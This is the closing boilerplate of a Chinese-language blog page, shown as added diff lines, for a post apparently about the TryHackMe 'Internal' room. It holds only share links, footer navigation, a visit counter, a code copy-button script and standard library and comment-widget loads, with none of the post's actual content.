+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://imli.ink/2024/11/23/internal/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://imli.ink/2024/11/23/internal/&text=THM-internal"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://imli.ink/2024/11/23/internal/&title=THM-internal"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://imli.ink/2024/11/23/internal/&is_video=false&description=THM-internal"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=THM-internal&body=Check out this article: https://imli.ink/2024/11/23/internal/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://imli.ink/2024/11/23/internal/&title=THM-internal"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://imli.ink/2024/11/23/internal/&title=THM-internal"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://imli.ink/2024/11/23/internal/&title=THM-internal"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://imli.ink/2024/11/23/internal/&title=THM-internal"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://imli.ink/2024/11/23/internal/&name=THM-internal&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://imli.ink/2024/11/23/internal/&t=THM-internal"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+      
+        
+          2016-2024
+            Leon
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       -->
+          <li><a href="/">
+              首页
+            </a></li><!--
+     -->
+          <!--
+       -->
+          <li><a href="/archives/">
+              归档
+            </a></li><!--
+     -->
+          <!--
+       -->
+          <li><a href="/tags/">
+              标签
+            </a></li><!--
+     -->
+          <!--
+       -->
+          <li><a href="/sites/">
+              站点
+            </a></li><!--
+     -->
+          <!--
+       -->
+          <li><a target="_blank" rel="noopener" href="http://github.com/leonooo13">
+              项目
+            </a></li><!--
+     -->
+          <!--
+       -->
+          <li><a href="/search/">
+              搜索
+            </a></li><!--
+     -->
+          <!--
+       -->
+          <li><a href="/about/">
+              关于
+            </a></li><!--
+     -->
+          
+      </ul>
+    </nav>
+  </div>
+  <div class="footer-center">
+    
+      <!-- 不蒜子统计 -->
+      <span id="busuanzi_container_site_pv">
+        总访问量<span id="busuanzi_value_site_pv"></span>次
+      </span>
+      <span class="post-meta-divider">|</span>
+      <span id="busuanzi_container_site_uv" style='display:none'>
+        访客数<span id="busuanzi_value_site_uv"></span>人
+      </span>
+      <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+      
+  </div>
+</footer>
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功！");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+    <script type="text/javascript">
+      var utterances_repo = 'leonooo13/Talk';
+      var utterances_issue_term = 'pathname';
+      var utterances_label = 'Comment';
+      var utterances_theme = 'photon-dark';
+
+      (function(){
+          var script = document.createElement('script');
+
+          script.src = 'https://utteranc.es/client.js';
+          script.setAttribute('repo', utterances_repo);
+          script.setAttribute('issue-term', 'pathname');
+          script.setAttribute('label', utterances_label);
+          script.setAttribute('theme', utterances_theme);
+          script.setAttribute('crossorigin', 'anonymous');
+          script.async = true;
+          (document.getElementById('utterances_thread')).appendChild(script);
+      }());
+  </script>
+
+
+
+<!-- FancyBox -->
+
+  <script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@4.0/dist/fancybox.umd.js"></script>
+  
+</body>
+</html>
